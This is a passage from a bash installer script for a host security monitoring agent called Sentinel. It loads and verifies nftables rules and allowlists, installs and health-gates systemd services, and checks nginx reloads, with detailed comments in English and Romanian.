        # left behind by mktemp: exactly the "confirmed intent, not effect"
        # failure this file warns about elsewhere, just one step earlier —
        # `$table_file` missing or unreadable would otherwise be reported as
        # nothing at all.
        if ! {
            echo "flush chain inet sentinel input"
            echo "flush chain inet sentinel forward"
            cat "$table_file"
        } > "$load_file"; then
            rm -f "$load_file"
            die "could not read ${table_file} while building the flush+reload file — nft was \
never invoked, and the running table is unchanged"
        fi
        if ! nft -f "$load_file"; then
            rm -f "$load_file"
            die "failed to reload the nftables table over the existing one (flush + load, one \
transaction) — the running table is UNCHANGED, because a rejected \`nft -f\` file commits nothing"
        fi
        rm -f "$load_file"
    else
        nft -f "$table_file" || die "failed to load the nftables table"
    fi

    # -- Prove the load was not doubled, rather than assume it -----------------
    #
    # The flush above is what stops a re-run from appending; checking that the
    # flush RAN would still be confirming intent, not effect — the mistake
    # this repository keeps shipping. So the live rule count is read back from
    # the kernel and compared against what the shipped file actually defines,
    # not against what this step assumes it defines.
    #
    # Counted by occurrences of '@' rather than 'saddr @': `forward` matches
    # the blocklist sets on BOTH `saddr` and `daddr` (see this file's own
    # comment on why), so a saddr-only count would read `forward` as half of
    # what it holds and never notice it doubling. The expected numbers are
    # pinned here, not derived from the file at runtime — tests/unit/
    # test_nftables_idempotent.py guards deploy/nftables/sentinel-table.nft
    # against drifting away from them unnoticed.
    local -A nft_expected_rules=( [input]=6 [forward]=6 )
    local nft_chain nft_listing nft_rule_count nft_expected
    for nft_chain in input forward; do
        nft_expected="${nft_expected_rules[$nft_chain]}"
        if nft_listing="$(nft list chain inet sentinel "$nft_chain" 2>&1)"; then
            nft_rule_count="$(printf '%s\n' "$nft_listing" | grep -c '@' || true)"
            if [[ "$nft_rule_count" == "$nft_expected" ]]; then
                ok "chain ${nft_chain}: ${nft_rule_count} rules, matches \
deploy/nftables/sentinel-table.nft"
            elif (( nft_rule_count > nft_expected )); then
                # More rules than the file defines: the flush above did not
                # prevent an append, most likely because this step ran again
                # over a table it had already loaded. Nothing is dropped that
                # should not be — the first matching terminal rule still
                # wins — but hit counts read back are inflated and the table
                # keeps growing on every further re-run.
                warn "chain ${nft_chain} has ${nft_rule_count} rules but \
deploy/nftables/sentinel-table.nft defines ${nft_expected} — DUPLICATED rules, most likely from \
this step re-running over a table it had already loaded; compare \`nft list chain inet sentinel \
${nft_chain}\` with the file by hand before trusting any block or watchlist count on this host"
            else
                # Fewer rules than the file defines: this is the dangerous
                # direction. A missing blocklist rule means a blocked address
                # is NOT being dropped, silently, which is the one failure
                # this whole table exists to prevent.
                warn "chain ${nft_chain} has only ${nft_rule_count} rules but \
deploy/nftables/sentinel-table.nft defines ${nft_expected} — rules are MISSING, which means \
blocked addresses may NOT be dropped on this host; reload the table with \`nft -f \
deploy/nftables/sentinel-table.nft\` and compare \`nft list chain inet sentinel ${nft_chain}\` \
with the file"
            fi
        else
            warn "cannot read chain ${nft_chain} back from the kernel: ${nft_listing//$'\n'/ } — \
its rule count is UNKNOWN, not confirmed correct"
        fi
    done

    # Two sets, because nftables types them: an element of allowlist_v4 is an
    # ipv4_addr and the kernel refuses anything else. Everything below is routed
    # by family through allowlist_element.
    local -a ALLOW_V4=("127.0.0.0/8" "10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16")

    # The v6 defaults are the counterparts of the v4 ones: loopback, and ULA
    # (fc00::/7), which is what RFC1918 is on this family.
    #
    # fe80::/10 is in DELIBERATELY. Link-local is where IPv6 keeps neighbour
    # discovery and router advertisements: a block landing on a fe80:: source —
    # a scanner seen on the local segment, a detector misfiring — would not drop
    # one peer, it would take the host off IPv6 altogether, which is the lockout
    # this list exists to prevent. It is also unroutable off-link. The price is
    # real and is paid knowingly: on a VPS the IPv4 segment is public, so a v4
    # neighbour stays blockable, while every fe80:: source on the segment is
    # permanently unblockable. Losing the host's IPv6 outright is worse than
    # not being able to block one same-segment tenant.
    local -a ALLOW_V6=("::1/128" "fc00::/7" "fe80::/10")

    if [[ -n "${ADMIN_IP:-}" ]]; then
        allowlist_collect "$ADMIN_IP" "--admin-ip"
    fi

    # Operator-supplied entries from the config: uptime monitors, CI runners,
    # office ranges, any high-volume source that must not be cut off.
    local cidr ip host db raw_extra extra_rc n_extra=0
    if [[ -f "${SENTINEL_CONFIG_DIR}/sentinel.yaml" ]]; then
        # Read into a variable rather than through `< <(...)`: a process
        # substitution throws the reader's exit status away, and that status is
        # the only thing that tells this step apart "the list was empty" from
        # "the list was there and I could not read it".
        extra_rc=0
        raw_extra="$(extra_allowlist_entries "${SENTINEL_CONFIG_DIR}/sentinel.yaml")" || extra_rc=$?
        if (( extra_rc == 3 )); then
            warn "extra_allowlist found but could not be read: flow list is not on one line. \
NOTHING from response.extra_allowlist was allowlisted. Put the whole [ ... ] on the \
extra_allowlist line, or use the block form with one \"- entry\" per line."
        elif (( extra_rc != 0 )); then
            warn "extra_allowlist could not be read (the reader exited ${extra_rc}); nothing \
from response.extra_allowlist was allowlisted"
        fi
        while read -r cidr; do
            if [[ -n "$cidr" ]]; then
                n_extra=$(( n_extra + 1 ))
                allowlist_collect "$cidr" "response.extra_allowlist"
            fi
        done <<< "$raw_extra"
    fi

    # The host's own addresses, BOTH families. This loop used to skip anything
    # containing a colon, so a host reached over IPv6 allowlisted none of the
    # addresses it answers on.
    while read -r ip; do
        if [[ -n "$ip" ]]; then allowlist_collect "$ip" "local address"; fi
    done < <(public_ips)

    # Blocking Telegram or Anthropic silently removes Sentinel's own alerting
    # and analysis — a failure with no symptom — so both names are resolved on
    # BOTH families.
    #
    # What `getent ahostsv6` actually does here was measured on both production
    # hosts, including the one running with net.ipv6.conf.all.disable_ipv6=1: it
    # exits 0 and prints three duplicate lines of a NATIVE IPv6 address. Not
    # nothing, and not ::ffff: mapped — the resolver answers out of DNS and does
    # not care whether this host can reach what it answered. So `sort -u` folds
    # the duplicates, and the addresses go into allowlist_v6 even on a host that
    # will never send a packet to them: an allowlist element that matches no
    # traffic costs nothing, while a missing one costs the alerting channel.
    #
    # The ::ffff: shape is still handled — allowlist_element folds it back to v4
    # — because it is what a glibc resolving with AI_V4MAPPED returns, and such
    # an element in allowlist_v6 could never match a packet. It is simply not
    # what these two hosts returned. Neither shape is an error and neither warns.
    for host in api.telegram.org api.anthropic.com; do
        for db in ahostsv4 ahostsv6; do
            while read -r ip; do
                if [[ -n "$ip" ]]; then allowlist_collect "$ip" "$host"; fi
            done < <(getent "$db" "$host" 2>/dev/null | awk '{print $1}' | sort -u)
        done
    done

    # ACCEPTED_* are what the kernel took, and they are what gets persisted.
    # ALLOW_* are what was offered, and they are only the denominator below.
    local n_v4 n_v6
    local -a ACCEPTED_V4=() ACCEPTED_V6=()
    nft_allowlist_add allowlist_v4 "${ALLOW_V4[@]}"
    n_v4=$NFT_ALLOWLIST_ADDED; ACCEPTED_V4=("${NFT_ALLOWLIST_ACCEPTED[@]}")
    nft_allowlist_add allowlist_v6 "${ALLOW_V6[@]}"
    n_v6=$NFT_ALLOWLIST_ADDED; ACCEPTED_V6=("${NFT_ALLOWLIST_ACCEPTED[@]}")
    # Counted per family, because that is the number an operator on an IPv6-only
    # path has to be able to read. A single total hid an allowlist_v6 that was
    # empty on every host this installer had ever touched.
    #
    # The extra_allowlist count is next to them because it is the one an
    # operator can act on directly: it is the list they edit, and "0 entries"
    # there next to a warn about an unreadable list is a different problem from
    # "3 entries" of which one was refused.
    ok "nftables table loaded; allowlist ${n_v4}/${#ALLOW_V4[@]} IPv4 and \
${n_v6}/${#ALLOW_V6[@]} IPv6 entries accepted by the kernel, blocklist empty; \
response.extra_allowlist supplied ${n_extra} entries"

    # Both sets carry `auto-merge`, so the kernel COALESCES elements that overlap
    # or abut: on production 17 persisted lines are 9 live elements. Said out
    # loud, because "I added seventeen and the listing shows nine" is exactly
    # what the silent-refusal bug this step was rewritten for looked like, and
    # an operator who cannot tell the two apart has to treat every install as
    # suspect.
    info "the allowlist sets carry auto-merge: overlapping or adjacent entries \
are coalesced by the kernel, so the listing below can show FEWER elements than \
the numbers above without anything having been refused"

    # -- Persist the RULESET and the ALLOWLIST, but never the blocklist -------
    #
    # The table does not survive a reboot, and until now nothing recreated it:
    # a host came back with no `inet sentinel` at all, so every block — manual
    # or automatic — failed silently for a day. The executor now reloads these
    # two files at startup.
    #
    # The split is the point. Allowlist entries MUST come back with the table,
    # because a table with drop rules and no allowlist is how you firewall your
    # own address. Blocks must NOT come back, because "rebooting is always a way
    # out of a self-inflicted block" is a guarantee this design makes and the
    # operator has been told to rely on.
    #
    # executor/commands.py appends to this same file in this same syntax when
    # `/allow` adds an address, already routing by family, so a v6 entry added
    # by hand later comes back with the rest.
    #
    # ONLY THE ELEMENTS THE KERNEL TOOK. The executor reloads this file with a
    # single `nft -f`, which is a single transaction: one line the kernel
    # refuses and the whole file is rolled back, so a host that had ONE bad
    # entry in extra_allowlist came back from a reboot with an empty allowlist
    # and a full set of drop rules. Writing what was offered rather than what
    # was accepted turned "rebooting is always a way out" into its opposite.
    install -d -m 0755 -o root -g root "${SENTINEL_PREFIX}/libexec"
    install -m 0644 -o root -g root "${SCRIPT_DIR}/nftables/sentinel-table.nft"         "${SENTINEL_PREFIX}/libexec/sentinel-table.nft"
    {
        echo "# Generated by install.sh. Loaded by the executor when the table"
        echo "# is missing at startup. Blocks are deliberately NOT persisted."
        echo "# Only elements the kernel accepted are listed: the executor loads"
        echo "# this file as ONE transaction, so one refused line would restore"
        echo "# nothing at all."
        for cidr in "${ACCEPTED_V4[@]}"; do
            echo "add element inet sentinel allowlist_v4 { ${cidr} }"
        done
        for cidr in "${ACCEPTED_V6[@]}"; do
            echo "add element inet sentinel allowlist_v6 { ${cidr} }"
        done
    } > "${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft"
    chown root:root "${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft"
    chmod 0644 "${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft"

    # And the file is CHECK-LOADED, because a file on disk is not proof that
    # anything can load it. `nft -c -f` runs the same parse and the same
    # evaluation the executor's `nft -f` will run at startup, and stops before
    # the commit.
    #
    # Measured on nft 1.0.9 (both production hosts, 7 September 2026): check
    # mode on a file whose every element is already in the running kernel exits
    # 0 with no output, and a refused line anywhere in the file fails the whole
    # check whatever precedes it. So exit 0 is the proof wanted here. The
    # "File exists" branch below was never observed on that version; it stays
    # as a fallback for an nft build that does surface EEXIST in check mode,
    # where it would also mean every line parsed and every set name resolved.
    # Anything else is a defect in what was just written, and it
    # stops the install: carrying on would hand the operator a host whose next
    # reboot silently drops the allowlist, which is the one thing this file
    # exists to prevent. Stopping here is safe — the chains are `policy accept`
    # and the blocklist sets are empty, so nothing is being dropped.
    local check_out
    if check_out="$(nft -c -f "${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft" 2>&1)"; then
        ok "allowlist persisted for restart (${#ACCEPTED_V4[@]} IPv4, ${#ACCEPTED_V6[@]} IPv6); \
the file passes \`nft -c -f\`"
    elif [[ "$check_out" == *"File exists"* ]]; then
        ok "allowlist persisted for restart (${#ACCEPTED_V4[@]} IPv4, ${#ACCEPTED_V6[@]} IPv6); \
it parses, and the kernel reports its elements already present — which is what it should say"
    else
        die "the persisted allowlist ${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft does not \
load: ${check_out//$'\n'/ } — after a reboot the executor loads this file in ONE transaction, so \
NOTHING would come back, including your own address."
    fi

    # BOTH sets, always. Printing only v4 is what let an empty allowlist_v6 pass
    # unnoticed on a host where every login arrives over IPv6: the operator read
    # a list that could not contain their address and saw nothing wrong. A set
    # that cannot be read back is reported as UNKNOWN, never as empty.
    local set_name listed
    for set_name in allowlist_v4 allowlist_v6; do
        if listed="$(nft list set inet sentinel "$set_name" 2>&1)"; then
            printf '%s\n' "$listed" | sed 's/^/    /'
        else
            warn "cannot read ${set_name} back from the kernel: ${listed//$'\n'/ } \
— its contents are UNKNOWN, not empty"
        fi
    done
}

# --- 30 -------------------------------------------------------------------
step_systemd() {
    # Hardening lives inline in each unit file, deliberately. A drop-in under
    # /etc/systemd/system/service.d/ would apply to EVERY service on the host,
    # including whatever was already running. Confining someone else's
    # production workload as a side effect of installing a monitoring agent is
    # not ours to do.
    for unit in "${SCRIPT_DIR}"/systemd/*.service "${SCRIPT_DIR}"/systemd/*.timer; do
        [[ -f "$unit" ]] || continue
        install -m 0644 "$unit" "/etc/systemd/system/$(basename "$unit")"
    done

    systemctl daemon-reload
    ok "systemd units installed"
}

# --- 31 -------------------------------------------------------------------
step_discovery() {
    sudo -u "$SENTINEL_USER" "${SENTINEL_PREFIX}/bin/sentinel" scan --discovery-only \
        2>/dev/null || warn "asset discovery is not available in this build (arrives in P2)"

    cat <<EOF

  Review ${SENTINEL_CONFIG_DIR}/inventory.yaml before enabling active scanning.
  Discovery proposes; it never confirms. An asset is not scanned with DAST until
  you set confirmed_by_operator: true on it — scanning something you do not own
  is not Sentinel's decision to make.

EOF
}

# --- 32 -------------------------------------------------------------------
# Cat timp supraveghem fiecare serviciu dupa pornire, inainte sa trecem la
# urmatorul. Trebuie sa depaseasca cel mai lung RestartSec din deploy/systemd/
# (azi 10s), ca o repornire automata sa aiba loc INAUNTRU si sa fie vazuta.
SERVICE_SETTLE_S=${SERVICE_SETTLE_S:-15}

step_start_services() {
    # One at a time, each behind a health gate. Starting six units at once and
    # then discovering three are broken is a much worse debugging session.
    # EVERY unit, not just two. A deploy that installs new code and restarts
    # only the executor and the web app leaves ingest, detect, ai and telegram
    # running the OLD code until somebody notices — which is a partial upgrade
    # that reports success, and the hardest kind of state to reason about
    # afterwards ("is this bug fixed on the server or not?").
    #
    # Ordered: the executor first because others talk to it, telegram last
    # because its restart is the most visible.
    local -a order=(sentinel-executor sentinel-web sentinel-ingest
                    sentinel-detect sentinel-ai sentinel-telegram)

    for unit in "${order[@]}"; do
        [[ -f "/etc/systemd/system/${unit}.service" ]] || { info "${unit}: not in this build"; continue; }

        systemctl enable "$unit" >/dev/null 2>&1 || true
        systemctl restart "$unit" || die "${unit} failed to start. journalctl -u ${unit} -n 50"

        local waited=0
        while (( waited < 10 )); do
            if systemctl is-active --quiet "$unit"; then break; fi
            sleep 1; waited=$((waited + 1))
        done

        if ! systemctl is-active --quiet "$unit"; then
            journalctl -u "$unit" -n 30 --no-pager >&2
            die "${unit} did not stay running. Nothing further will be started."
        fi

        # `is-active` o dată nu dovedeşte că serviciul RĂMÂNE pornit.
        #
        # Un proces care moare la pornire şi e repornit de systemd trece prin
        # `active` la fiecare ciclu, iar o verificare care se uită o dată îl
        # prinde exact acolo. Aşa a trecut de poarta asta un bot de Telegram care
        # crăpa în `build_application`: deploy-ul a raportat „active", iar
        # contorul de reporniri a ajuns la 1113 înainte să observe cineva că
        # nu mai vine nicio alertă.
        #
        # Numărul de reporniri e dovada. Dacă creşte cât ne uităm, unitatea e în
        # buclă, oricât de `active` ar părea la un moment dat.
        # Supravegheat, nu eşantionat la un moment calculat.
        #
        # O versiune anterioară deducea fereastra din `RestartUSec`, pe premisa
        # că systemd o dă în microsecunde. Nu o dă: systemd 252 formatează
        # întotdeauna uman — `2s`, `10s`, `100ms`. Extrăgând cifrele, `100ms`
        # devenea 100 şi producea o fereastră de 105 secunde per unitate, iar
        # `1min` devenea 1 şi producea una de 8 secunde, mai SCURTĂ decât
        # intervalul de repornire — exact defectul pe care schimbarea pretindea
        # că îl elimină.
        #
        # Nu e nevoie de niciun calcul. Un proces care moare petrece timp în
        # `activating` până la repornire, oricât de lung ar fi intervalul, iar
        # unul care reporneşte repede creşte contorul. Verificate amândouă, o
        # dată pe secundă. Prima abatere opreşte instalarea; nu aşteptăm restul
        # ferestrei ca să confirmăm ce ştim deja.
        local before now_state waited=0
        before="$(systemctl show "$unit" -p NRestarts --value 2>/dev/null)"
        while (( waited < SERVICE_SETTLE_S )); do
            sleep 1; waited=$((waited + 1))
            now_state="$(systemctl is-active "$unit" 2>/dev/null || true)"
            if [[ "$now_state" != "active" ]]; then
                journalctl -u "$unit" -n 40 --no-pager >&2
                die "${unit} nu a rămas pornit: după ${waited}s e '${now_state:-necunoscut}'.
    'active' la o singură verificare nu înseamnă nimic pentru un proces care
    moare şi e repornit. Nu pornesc nimic mai departe."
            fi
            local nrestarts
            nrestarts="$(systemctl show "$unit" -p NRestarts --value 2>/dev/null)"
            if [[ "$nrestarts" != "$before" ]]; then
                journalctl -u "$unit" -n 40 --no-pager >&2
                die "${unit} se reporneşte în buclă: ${before} → ${nrestarts} reporniri în ${waited}s.
    Nu pornesc nimic mai departe."
            fi
        done
        ok "${unit} active şi stabil ${SERVICE_SETTLE_S}s (${before:-?} reporniri)"
    done

    # Reconciliation runs at boot AND hourly. Boot is the main event — that
    # is when the kernel loses every block — but a table can also be dropped
    # while the host stays up, by another tool or by hand.
    systemctl enable sentinel-reconcile.service >/dev/null 2>&1 \
        && ok "sentinel-reconcile.service enabled (runs at boot)"

    for unit in sentinel-health.timer sentinel-maintenance.timer \
                sentinel-watchdog.timer sentinel-selfcheck.timer \
                sentinel-reconcile.timer sentinel-restore-drill.timer \
                sentinel-patch-window.timer; do
        [[ -f "/etc/systemd/system/${unit}" ]] && systemctl enable --now "$unit" >/dev/null 2>&1 \
            && ok "${unit} enabled"
    done

    start_beacon_unit /etc/systemd/system/sentinel-beacon.service
    start_shipper_unit /etc/systemd/system/sentinel-shipper.service
}

# Repornirea beaconului, cu poarta pe care nu o poate trece un expeditor mut.
#
# Calea unității vine ca ARGUMENT, nu ca variabilă de mediu cu valoare implicită:
# un knob de mediu într-un instalator e ceva ce cineva ajunge să pună din
# greșeală în producție, iar aici nu e nevoie de el — apelantul o scrie o dată,
# iar testul îi dă un director propriu.
start_beacon_unit() {
    local unit_file="$1"

    # The beacon is opt-in and deliberately NOT in the ordered list above. That
    # list dies on a unit that will not stay running, which is right for the
    # pipeline and wrong here: with beacon.enabled false the process says so
    # once in the journal and exits 0, leaving the unit inactive rather than
    # failed. Aborting an install over a component the operator has not turned
    # on yet would be absurd. Enable it either way, so that turning it on later
    # is one `systemctl restart`, not an archaeology session.
    if [[ ! -f "$unit_file" ]]; then
        info "sentinel-beacon.service: not in this build (${unit_file})"
        return 0
    fi
    systemctl enable sentinel-beacon.service >/dev/null 2>&1 || true

    # POARTA. Din august 2026 expeditorul refuză să trimită un semnal pe care
    # nu-l poate semna cu identitatea gazdei (sentinel/report/beacon.py), fiindcă
    # un semnal fără nume aterizează în găleata comună `default`. Deci o
    # repornire făcută peste un fișier de identitate lipsă sau stricat nu
    # „actualizează" beaconul, ci îl oprește din bătut — și martorul raportează,
    # corect din punctul lui de vedere, o alarmă critică despre un server viu.
    #
    # `ensure_instance_id` rulează necondiționat înaintea acestui pas, deci
    # fișierul LIPSĂ nu mai e cazul obișnuit. Ce rămâne, și de ce poarta merită
    # să existe: funcția aia refuză DELIBERAT să rescrie un fișier existent dar
    # nevalid (octeți NUL, scriere trunchiată, valoare pusă de mână) — avertizează
    # și iese cu 0. Fără poarta asta, exact acel caz ajungea la o repornire care
    # transformă un beacon care bate într-unul mut.
    #
    # A NU reporni e alegerea mai bună dintre două rele: procesul vechi rămâne
    # în picioare cu codul dinaintea livrării, deci martorul continuă să audă
    # ceva, iar `code:current` din autodiagnostic raportează că unitatea rulează
    # cod vechi. Tăcerea nu se raportează de nicăieri.
    local rc=0
    read_instance_id_file "${SENTINEL_CONFIG_DIR}/instance_id" || rc=$?
    if (( rc != 0 )) || [[ ! "$INSTANCE_ID_READ" =~ ^[0-9a-f]{32}$ ]]; then
        warn "NU repornesc sentinel-beacon: ${SENTINEL_CONFIG_DIR}/instance_id nu"
        warn "conține o identitate validă, iar expeditorul refuză să trimită un"
        warn "semnal pe care nu-l poate atribui acestei gazde. Repornit acum, ar"
        warn "amuți, iar martorul ar suna o alarmă critică despre un server viu."
        warn "Uită-te în fișier (od -c), șterge-l dacă nu e o identitate, apoi:"
        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
        warn "Până atunci procesul vechi rămâne pornit, cu codul dinaintea acestei"
        warn "livrări — autodiagnosticul îl raportează la 'code:current'."
        return 0
    fi

    # restart, not `enable --now`: on a host where the beacon is already
    # running, `--now` is a no-op and the process keeps executing the code
    # from the previous deployment. It would look enabled, report healthy,
    # and quietly never pick up a fix.
    if systemctl restart sentinel-beacon.service 2>/dev/null; then
        ok "sentinel-beacon.service enabled and restarted"
    else
        info "sentinel-beacon.service installed but not started (beacon.enabled is false)"
    fi
}

# Expeditorul de loturi. Aceeași formă ca beaconul, și separată dinadins.
#
# De ce trebuie ACTIVATĂ, nu doar copiată: pasul de mai sus instalează fiecare
# `deploy/systemd/*.service` de pe disc, deci unitatea ajunge pe gazdă oricum.
# O unitate instalată și neactivată e o componentă care nu rulează niciodată —
# iar `scripts/smoke-test.sh` enumeră unitățile TOT de pe disc, deci una care
# rămâne `inactive` fără timer și fără scutire raportează „deployment eșuat" pe
# fiecare gazdă, inclusiv pe cele unde `ship.enabled: false` e exact ce trebuie.
# Ambele capete ale problemei sunt aceeași cauză: două locuri enumeră unitățile
# și niciunul nu era generat.
start_shipper_unit() {
    local unit_file="$1"

    if [[ ! -f "$unit_file" ]]; then
        info "sentinel-shipper.service: not in this build (${unit_file})"
        return 0
    fi
    # Necondiționat, ca la beacon: cu `ship.enabled` fals procesul spune o dată
    # în jurnal și iese cu 0, deci activarea nu costă nimic, iar pornirea de mai
    # târziu e un `systemctl restart` în loc de o sesiune de arheologie.
    systemctl enable sentinel-shipper.service >/dev/null 2>&1 || true

    # ACEEAȘI POARTĂ ca la beacon, cu o miză diferită — și diferența merită
    # scrisă, fiindcă altfel poarta pare copiată din reflex.
    #
    # Un beacon mut produce o alarmă CRITICĂ falsă la martor. Un expeditor mut nu
    # produce nicio alarmă externă: `ship_once` întoarce
    # `ShipResult(False, "fără identitate de instalare")`, rândurile rămân în
    # coadă, iar singurul care spune ceva e `ship:lag` din autodiagnostic, la
    # următoarea rulare a `sentinel-selfcheck.timer`.
    #
    # Poarta există totuși, din același motiv: repornit peste o identitate
    # stricată, un expeditor care EXPEDIA devine unul care nu mai expediază, și
    # rândurile lui nu ajung la agregator cât timp nimeni nu se uită. Procesul
    # vechi, lăsat în picioare, continuă să expedieze sub identitatea pe care a
    # citit-o deja — iar `code:current` raportează că rulează cod vechi. Dintre
    # „vechi dar expediază" și „nou și tăcut", primul se vede de undeva.
    local rc=0
    read_instance_id_file "${SENTINEL_CONFIG_DIR}/instance_id" || rc=$?
    if (( rc != 0 )) || [[ ! "$INSTANCE_ID_READ" =~ ^[0-9a-f]{32}$ ]]; then
        warn "NU repornesc sentinel-shipper: ${SENTINEL_CONFIG_DIR}/instance_id nu"
        warn "conține o identitate validă, iar expeditorul refuză să trimită un lot"
        warn "pe care nu-l poate atribui acestei gazde — rândurile a două gazde"
        warn "fără identitate ar ajunge într-un singur lanț de audit, care ar arăta"
        warn "rupt în permanență fără să fie rupt ceva."
        warn "Uită-te în fișier (od -c), șterge-l dacă nu e o identitate, apoi:"
        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
        warn "Până atunci procesul vechi rămâne pornit, cu codul dinaintea acestei"
        warn "livrări — autodiagnosticul îl raportează la 'code:current'."
        return 0
    fi

    # restart, nu `enable --now`: pe o gazdă unde expeditorul rulează deja,
    # `--now` e operație nulă și procesul continuă să execute codul livrării
    # dinainte. Ar părea activat, ar raporta sănătos, și n-ar prelua niciodată o
    # reparație.
    if systemctl restart sentinel-shipper.service 2>/dev/null; then
        ok "sentinel-shipper.service enabled and restarted"
    else
        info "sentinel-shipper.service installed but not started (ship.enabled is false)"
    fi
}

# Fragmentele incluse de vhost-urile Sentinel.
#
# NU in /etc/nginx/conf.d/. Acel director e inclus de nginx.conf in contextul
# `http`, iar un fisier de `add_header` pus acolo se aplica FIECARUI site de pe
# gazda care nu-si defineste propriile antete. Sentinel a impus astfel un
# `Content-Security-Policy: default-src 'self'` si un HSTS cu includeSubDomains
# tuturor site-urilor operatorului - adica a stricat orice pagina care incarca
# un script de CDN sau un font extern, si a fortat HTTPS pe subdomenii pentru un
# an, memorat in browserele vizitatorilor.
#
# Un agent de monitorizare nu are voie sa schimbe comportamentul lucrurilor pe
# care le monitorizeaza. Fragmentele stau intr-un director propriu si sunt
# incluse explicit, doar in blocurile `server` ale Sentinel.
# Reincarca nginx SI verifica faptul, nu codul de iesire.
#
# `systemctl reload nginx` intoarce 0 daca a reusit sa TRIMITA semnalul, nu daca
# noua configuratie a fost aplicata. Cand masterul respinge configuratia, isi
# pastreaza procesele vechi si continua sa serveasca versiunea precedenta - cu
# un [emerg] in error.log pe care nu-l citeste nimeni.
#
# S-a intamplat pe productie. O zona `limit_req` isi schimbase cheia, iar cheia
# unei zone de memorie partajata nu se poate schimba la reload, doar la restart.
# `nginx -t` trecea, fiindca verifica sintaxa unei analize noi, nu
# compatibilitatea cu zonele deja alocate. Patru reincarcari consecutive au
# raportat succes; procesele nginx erau de trei zile vechi. Doua reparatii
# livrate in ziua aceea pareau sa nu functioneze, si erau amandoua corecte.
#
# Dovada ca reincarcarea a avut loc e aparitia unor procese noi. Nimic altceva
# nu o dovedeste.
nginx_workers() { pgrep -f 'nginx: worker process' 2>/dev/null | sort -n | tr '
' ' '; }

reload_nginx() {
    local before after new
    before="$(nginx_workers)"
    systemctl reload nginx || die "nginx reload failed"
    sleep 1
    after="$(nginx_workers)"

    new=""
    for pid in $after; do
        [[ " $before " == *" $pid "* ]] || new="${new}${pid} "
    done
    if [[ -n "$new" ]]; then
        ok "nginx reloaded (procese noi: ${new% })"
        return 0
    fi

    local why
    why="$(grep -F '[emerg]' /var/log/nginx/error.log 2>/dev/null | tail -1)"
    warn "nginx a ACCEPTAT semnalul de reincarcare dar a pastrat procesele vechi.
    Configuratia de pe disc NU e in vigoare. Motivul din error.log:
      ${why:-<nimic in /var/log/nginx/error.log>}"

    # `nginx -t` trece, deci un restart e sigur si e singura cale de aplicare.
    # Alternativa - sa mergem mai departe - inseamna ca tot ce urmeaza
    # (certificate, antete, vhost) se raporteaza reusit fara sa fie in vigoare.
    if nginx -t >/dev/null 2>&1; then
        warn "nginx -t trece, deci se reporneste. Cateva conexiuni in curs vor cadea."
        systemctl restart nginx || die "restartul nginx a esuat. INSPECTEAZA /etc/nginx ACUM."
        ok "nginx repornit; configuratia e acum in vigoare"
    else
        die "nginx -t NU trece si reincarcarea nu s-a aplicat. Nu repornesc: ar lasa
    nginx oprit, iar acum inca serveste. Repara configuratia si reporneste manual."
    fi
}

# Does anything in the EFFECTIVE nginx configuration still bind :80?
#
# `nginx -T` is the whole configuration as nginx itself assembles it, includes
# resolved. It is the only place where "is this listener active" is a fact
# rather than a guess about which file the block might be in — and guessing the
# file is exactly how the :80 neutralisation came to report success on Ubuntu
# without having edited anything.
#
# Three outcomes, and the third is why this returns a code instead of a boolean:
#
#   0  yes, something still listens on :80
#   1  no
#   2  could not tell (nginx absent, or it refused to dump its configuration)
#
# Collapsing 2 into 1 would print "port 80 released" over a host whose nginx
# will not even parse its own configuration.
nginx_listens_on_80() {
    local dump
    have nginx || return 2
    dump="$(nginx -T 2>/dev/null)" || return 2
    # `listen 80`, `listen 0.0.0.0:80`, `listen *:80`, `listen [::]:80`, with or
    # without default_server / ssl after it. The trailing [^0-9] keeps :8080 and
    # :8000 out of it.
    grep -qE '^[[:space:]]*listen[[:space:]]+(\[::\]:|[0-9.]+:|\*:)?80([^0-9]|$)' <<< "$dump"
}

# Which block already claims default_server on this port — asked of what nginx
# ACTUALLY LOADS, not of what happens to be on disk.
#
#   $1        the port
#   $2..$n    paths that are OURS, and so are not "another vhost"
#
# `nginx -T` is the whole effective configuration with includes resolved, and
# it is the only place where "does something else already own this port" is a
# fact rather than a guess about which files nginx might read. The previous
# version of this measurement grepped /etc/nginx/ recursively, which counts
# files nginx never loads: Debian's sites-available/*, and hand-made backups —
# production carries one of those today, /etc/nginx/conf.d/sentinel-shared\
# .conf.bak-selfsigned.
#
# The failure that opens: on a dedicated host, a conf.d/sentinel.conf.bak-<date>
# left behind by an earlier no-domain install holds `listen <port> …
# default_server`, matches neither exclusion by name, and would make EVERY
# later no-domain deploy die — the "works once, then blocks every re-deploy"
# outcome the exclusions exist to prevent, arriving through the back door, and
# now fatal rather than merely skipping the deny block. nginx does not include
# that file, so nginx does not report it.
#
# Same three outcomes as nginx_listens_on_80 three screens up, for the same
# reason:
#
#   0  yes — the file(s) that declare it are on stdout
#   1  no
#   2  could not look (nginx absent, or it refused to dump its configuration)
#
# Collapsing 2 into 1 would answer "nothing else owns this port" about a host
# whose nginx will not parse its own configuration.
nginx_foreign_default_on_port() {
    local port="$1"; shift
    local dump current="" line found="" ignored
    have nginx || return 2
    dump="$(nginx -T 2>/dev/null)" || return 2

    # The trailing [^0-9;] is what keeps :84430 from matching :8443; the old
    # grep had `[^;]*` straight after the port and would have counted it.
    local re="^[[:space:]]*listen[[:space:]]+(\[::\]:|[0-9.]+:|\*:)?${port}[^0-9;][^;]*default_server"

    while IFS= read -r line; do
        # nginx -T labels every file it read with this exact header line; it is
        # what makes the answer attributable to a file, which a flat grep of
        # the dump would not be.
        if [[ "$line" == '# configuration file '*: ]]; then
            current="${line#\# configuration file }"
            current="${current%:}"
            continue
        fi
        [[ "$line" =~ $re ]] || continue
        for ignored in "$@"; do
            [[ "$current" == "$ignored" ]] && continue 2
        done
        [[ " $found " == *" $current "* ]] && continue
        found="${found}${current} "
    done <<< "$dump"

    [[ -n "$found" ]] || return 1
    printf '%s\n' $found
}

SENTINEL_NGINX_SNIPPET_DIR=/etc/nginx/sentinel

install_sentinel_nginx_snippets() {
    install -d -m 0755 "$SENTINEL_NGINX_SNIPPET_DIR"
